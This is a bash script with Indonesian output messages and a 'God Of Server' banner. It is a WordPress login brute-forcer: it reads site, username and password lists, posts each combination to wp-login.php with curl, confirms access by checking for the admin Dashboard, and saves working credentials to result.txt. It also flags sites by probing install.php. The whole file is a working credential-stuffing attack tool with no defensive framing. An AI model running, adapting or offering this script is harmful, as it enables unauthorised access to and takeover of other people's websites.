#!/bin/bash


GREEN='\033[0;32m'
NC='\033[0m' # No Color

# ASCII art untuk "God Of Server"
echo '

▒█▀▀█ █▀▀█ █▀▀▄ 　 ▒█▀▀▀█ █▀▀ 　 ▒█▀▀▀█ █▀▀ █▀▀█ ▀█░█▀ █▀▀ █▀▀█ 
▒█░▄▄ █░░█ █░░█ 　 ▒█░░▒█ █▀▀ 　 ░▀▀▀▄▄ █▀▀ █▄▄▀ ░█▄█░ █▀▀ █▄▄▀ 
▒█▄▄█ ▀▀▀▀ ▀▀▀░ 　 ▒█▄▄▄█ ▀░░ 　 ▒█▄▄▄█ ▀▀▀ ▀░▀▀ ░░▀░░ ▀▀▀ ▀░▀▀
'


list_file="list.txt"
user_file="user.txt"
pass_file="pass.txt"
result_file="result.txt"
wpinstall_file="wpinstall.txt"


> "${result_file}"
> "${wpinstall_file}"


function try_login {
    local site=$1
    local user=$2
    local pass=$3

    
    login_url="${site}/wp-login.php"
    post_data="log=${user}&pwd=${pass}&wp-submit=Log+In&redirect_to=${site}/wp-admin/"

    
    curl -sS -c cookies.txt -b cookies.txt -d "${post_data}" "${login_url}" > /dev/null

    
    admin_page="${site}/wp-admin/"
    admin_check=$(curl -sS -b cookies.txt "${admin_page}")

    if [[ ${admin_check} == *"Dashboard"* ]]; then
        echo -e "${GREEN}Login berhasil untuk ${site} sebagai ${user}${NC}"
        echo "${site} - ${user}:${pass}" >> "${result_file}"
        return 0
    fi

    
    install_page="${site}/wp-admin/install.php"
    install_check=$(curl -sS -b cookies.txt "${install_page}")

    if [[ ${install_check} == *"WordPress already installed"* ]]; then
        echo "Situs ${site} belum diatur untuk login, coba diinstall.php"
        echo "${site} - ${user}:${pass}" >> "${wpinstall_file}"
        return 0
    fi

    echo "Gagal login untuk ${site} sebagai ${user}"
    return 1
}

# Baca file list.txt
while IFS= read -r site
do
    
    read -r user <&3
    read -r pass <&4
    
    echo "Mencoba login ke ${site} sebagai ${user}..."

    
    if try_login "${site}" "${user}" "${pass}"; then
        echo "Berhasil login atau situs belum diatur."
    else
        echo "Gagal login atau situs tidak dapat diinstall."
    fi

    
    rm cookies.txt


done 3<"${user_file}" 4<"${pass_file}" <"${list_file}"
